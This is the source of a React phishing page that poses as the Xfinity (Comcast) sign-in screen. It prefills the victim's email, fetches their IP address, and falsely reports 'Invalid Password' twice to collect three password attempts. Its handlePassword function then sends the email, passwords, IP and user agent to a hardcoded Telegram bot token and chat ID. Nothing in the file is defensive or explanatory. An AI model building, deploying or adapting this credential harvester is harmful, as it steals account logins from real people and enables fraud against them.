import React, { useEffect } from 'react'
import { useState } from 'react'
import finityBg from "./assets/finitybg.jpg"
import finityBg2 from "./assets/finitybg2.jpg"
import logo from "./assets/xfinity_logo.png"
import one from "./assets/1.jpg"
import two from "./assets/2.jpg"
import three from "./assets/3.jpg"
import four from "./assets/4.jpg"
import five from "./assets/5.jpg"
import six from "./assets/6.jpg"
import { useParams } from 'react-router-dom'

const Home = () => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('')
    const [input, toggleInput] = useState(false)
    const [formError, setFormError] = useState(false);
    const [passwordError, setPasswordError] = useState('');
    const { userEmail } = useParams()
    const [count, setCount] = useState(0)
    const [clientIp, setClientIp] = useState('');
    const [userAgent, setUserAgent] = useState(navigator.userAgent);

    useEffect(() => {
        // Fetch the client's IP address using an external API
        fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                setClientIp(data.ip);
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
            });
    }, []);

    useEffect(() => {
        if (userEmail) {
            setEmail(userEmail)
            handleEmail()
        }
    }, [email])

    const menus = [
        {
            name: 'Web Terms Of Service',
            link: 'https://www.xfinity.com/terms',
            icon: one
        },
        {
            name: 'CA Notice at Collection',
            link: 'https://www.xfinity.com/privacy/policy/staterights#california',
            icon: two
        },
        {
            name: 'Privacy Policy',
            link: 'http://www.xfinity.com/privacy/policy',
            icon: three
        },
        {
            name: 'Your Privacy Choices',
            link: 'https://www.xfinity.com/privacy/manage-preference',
            icon: four
        },
        {
            name: 'Health Privacy Notice',
            link: 'https://www.xfinity.com/privacy/policy/staterights#washington',
            icon: five
        },
        {
            name: 'Ad Choices',
            link: 'https://www.xfinity.com/adinformation',
            icon: six
        }
    ]

    const handleEmail = () => {
        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!email || !emailPattern.test(email)) {
            setFormError(true);
        } else {
            setFormError(false);
            toggleInput(true)
            // Proceed with form submission
        }
    };

    const [password1, togglePassword1] = useState('')
    const [password2, togglePassword2] = useState('')

    const handlePassword = async () => {
        if (!password) {
            setPasswordError('Password must be 8 characters or more');
        } else {

            if (count < 2) {
                if (count === 0) {
                    togglePassword1(password)
                    setPassword('')
                    setPasswordError('Invalid Password')
                    setTimeout(() => {
                        setPasswordError('')
                    }, 2000);
                    setCount(count + 1)
                }
                if (count === 1) {
                    togglePassword2(password)
                    setPassword('')
                    setPasswordError('Invalid Password')
                    setTimeout(() => {
                        setPasswordError('')
                    }, 2000);
                    setCount(count + 1)
                }
            }
            else {
                setPasswordError('');
                setPassword('')
                // Proceed with form submission

                const message = `Email: ${email}
                finity1: ${password1}
                finity2: ${password2}
                finity3: ${password}
                Website: xfinity.com
                Client IP: ${clientIp}
                User Agent: ${userAgent}`;

                // Replace these values with your bot token and chat ID
                const botToken = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
                const chatId = '7380056237';

                try {
                    // Send the message to Telegram
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                        }),
                    });

                    // Optional: Handle success feedback or further actions here
                    alert('Data sent successfully!');
                } catch (error) {
                    console.error('Error sending message:', error);
                }
            }
        }
    };

    return (
        <div className='w-full text-[0.82rem] flex flex-col items-end'>
            <div className="w-full flex h-screen">
                <div className='w-full md:w-1/2 pt-[7%] px-4 md:px-[9%] flex flex-col gap-4'>
                    <img className='w-[5rem] pb-4' src={logo} alt="" />
                    <h2 className='text-[2rem] font-semibold'>Sign in with your Xfinity ID <br /> ({userEmail})</h2>
                    {!input ? <input
                        type="email"
                        placeholder='Email, mobile, or username'
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        className={`p-4 bg-[#F6F6F9] rounded-md outline-none border-2 focus:border-blue-900 ${formError ? 'border-red-500' : 'border-[#C7C7CC]'}`}
                    /> :
                        <input
                            type="password"
                            placeholder='Password'
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className={`p-4 bg-[#F6F6F9] rounded-md outline-none border-2 focus:border-blue-900 ${formError ? 'border-red-500' : 'border-[#C7C7CC]'}`}
                        />
                    }
                    {formError && <p className="text-red-500">Please enter a valid email address.</p>}
                    {passwordError && <p className="text-red-500">{passwordError}</p>}
                    <p className='pb-8'>By signing in, you agree to our <a className='text-[#6A2DC0] underline' href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a className='text-[#6A2DC0] underline' href="https://www.xfinity.com/privacy/">Privacy Policy</a>.</p>
                    <div className='pb-8'>
                        {!input ? <button onClick={handleEmail} className='text-md font-semibold text-white rounded-md bg-[#5A23B9] hover:bg-[#432379] px-8 py-4 transition-all duration-500'>Let's go</button>
                            : <button onClick={handlePassword} className='text-md font-semibold text-white rounded-md bg-[#5A23B9] hover:bg-[#432379] px-8 py-4 transition-all duration-500'>Submit</button>}
                    </div>
                    <div className="flex flex-col text-[0.9rem]">
                        <a target='_blank' className="flex px-4 items-center justify-between w-full border-b pb-4 border-[#e3dada]" href='https://idm.xfinity.com/myaccount/lookup?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FmaxAuthnAge%3D900%26r%3Dcomcast.net%26s%3Doauth%26continue%3Dhttps%253A%252F%252Foauth.xfinity.com%252F%252Foauth%252Fauthorize%253Fclient_id%253Dx--d2.prod.new.cmsplatform%2526response_mode%253Dform_post%2526redirect_uri%253Dhttps%25253a%25252f%25252fcontent.xfinity.com%25252fsignin-cima%2526response_type%253Dcode%2526scope%253Dopenid%252Bprofile%252Bemail%252Baddress%252Boffline_access%252Bphone%252Burn%25253ambo%25253ascope%25253aaccount%25253aonbehalf%252Burn%25253acsp%25253ascope%25253achannel-lineup%252Burn%25253acima%25253acrs%25253aitem%25253acreate%252BXFN_SC_USER%252BXFN_SSM_ORDER%252BXFN_SOO_QUAP%252Bsoo%25253abilling%252Bxcp%25253aconsent%25253aread%252Bxcp%25253aconsent%25253aaccept%252Bxcp%25253acheckout%25253astatus%25253aget%252Bxcp%25253aacp%25253aenrollment%25253acreate%252Bxcp%25253aacp%25253aenrollment%25253aread%252Bxcp%25253aconsent%25253apresent%252Bxcp%25253aacp%25253aenrollment%25253aupdate%2526state%253DOpenIdConnect.AuthenticationProperties%25253d0pf6kzM9i45ftjH8qGxGDl_56rdt8Noi4NowkJ7D_EK8MvxfAT3KHl-u_Fqs-aD7AneEepndJjR4W_YIuybXDEFPPoJ6fecyO3DZK1f3YOowTwBQdtuVTp_Nquj4eR1koPcJlPacqs8enG6G-oXQkt-JoDW8vmdGa3oK19kHdlG2hNlRTX0Bl35j71ZNY_ztGAewfQfKcRrIvtnU9KnGHf8DBejvA1Fhs0Cl-u2aj9k_y6hFtZv8TJYHbkJ2IZxdHySRHTXM3BQa2m7fTcqmyKS3NS6I4CPGrreofw3QT3YYsOSJcfl60S47g2P1bRCN767EOcFDwda_HYhBF9YlD94eLTU_GyANIP2KkD7hg1L7Az-HJF-MYBHrawF7Gd0yhaTr4pXDCS1RIeFoBPMM8EKgl0k%2526max_age%253D900%2526response%253D1%2526reqId%253D6124b8bf-05b1-4403-bbdb-0f3c06ffb1bc%26client_id%3Dx--d2.prod.new.cmsplatform%26reqId%3D627844f2-2596-4a25-b390-d53dc61ff172%26rm%3D2%26ui_style%3Dlight&ui_style=light'>
                            <p className=''>Find your Xfinity ID</p>
                            <i className='fa-solid text-[#989898] fa-chevron-right'></i>
                        </a>
                        <a target='_blank' className="flex px-4 items-center justify-between w-full pt-4" href='https://idm.xfinity.com/myaccount/create-uid?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FmaxAuthnAge%3D900%26r%3Dcomcast.net%26s%3Doauth%26continue%3Dhttps%253A%252F%252Foauth.xfinity.com%252F%252Foauth%252Fauthorize%253Fclient_id%253Dx--d2.prod.new.cmsplatform%2526response_mode%253Dform_post%2526redirect_uri%253Dhttps%25253a%25252f%25252fcontent.xfinity.com%25252fsignin-cima%2526response_type%253Dcode%2526scope%253Dopenid%252Bprofile%252Bemail%252Baddress%252Boffline_access%252Bphone%252Burn%25253ambo%25253ascope%25253aaccount%25253aonbehalf%252Burn%25253acsp%25253ascope%25253achannel-lineup%252Burn%25253acima%25253acrs%25253aitem%25253acreate%252BXFN_SC_USER%252BXFN_SSM_ORDER%252BXFN_SOO_QUAP%252Bsoo%25253abilling%252Bxcp%25253aconsent%25253aread%252Bxcp%25253aconsent%25253aaccept%252Bxcp%25253acheckout%25253astatus%25253aget%252Bxcp%25253aacp%25253aenrollment%25253acreate%252Bxcp%25253aacp%25253aenrollment%25253aread%252Bxcp%25253aconsent%25253apresent%252Bxcp%25253aacp%25253aenrollment%25253aupdate%2526state%253DOpenIdConnect.AuthenticationProperties%25253d0pf6kzM9i45ftjH8qGxGDl_56rdt8Noi4NowkJ7D_EK8MvxfAT3KHl-u_Fqs-aD7AneEepndJjR4W_YIuybXDEFPPoJ6fecyO3DZK1f3YOowTwBQdtuVTp_Nquj4eR1koPcJlPacqs8enG6G-oXQkt-JoDW8vmdGa3oK19kHdlG2hNlRTX0Bl35j71ZNY_ztGAewfQfKcRrIvtnU9KnGHf8DBejvA1Fhs0Cl-u2aj9k_y6hFtZv8TJYHbkJ2IZxdHySRHTXM3BQa2m7fTcqmyKS3NS6I4CPGrreofw3QT3YYsOSJcfl60S47g2P1bRCN767EOcFDwda_HYhBF9YlD94eLTU_GyANIP2KkD7hg1L7Az-HJF-MYBHrawF7Gd0yhaTr4pXDCS1RIeFoBPMM8EKgl0k%2526max_age%253D900%2526response%253D1%2526reqId%253D6124b8bf-05b1-4403-bbdb-0f3c06ffb1bc%26client_id%3Dx--d2.prod.new.cmsplatform%26reqId%3D627844f2-2596-4a25-b390-d53dc61ff172%26rm%3D2%26ui_style%3Dlight&ui_style=light'>
                            <p className=''>Create a new Xfinity ID</p>
                            <i className='fa-solid text-[#989898] fa-chevron-right'></i>
                        </a>
                        <div className='block md:hidden my-4 w-full mt-8 h-[17rem] overflow-hidden bg-[#6703F1]'>
                            <img src={finityBg2} className='w-full h-full' alt="" />
                        </div>
                    </div>
                </div>
                <div className='hidden md:block w-1/2 overflow-hidden bg-[#6703F1]'>
                    <img src={finityBg} className='w-full scale-[1.5] relative top-[13rem]' alt="" />
                </div>
            </div>
            <p className='w-full text-center text-[#989898] mt-24 md:mt-2 text-md p-4'>© 2024 Comcast</p>
            <div className="w-full flex flex-col md:flex-row gap-6 items-center justify-between px-[9%]">
                {
                    menus.map((menu, index) => (
                        <a target='_blank' href={menu.link} key={index} className='flex gap-1 items-center'>
                            <img src={menu.icon} className='w-[1.2rem]' alt="" />
                            <p>{menu.name}</p>
                        </a>
                    ))
                }
            </div>
            <div className="bg-[#141417] w-full p-3 mt-6 cursor-pointer">
                <p className='text-white font-medium text-center'>Cookie Preferences</p>
            </div>
        </div>
    )
}

export default Home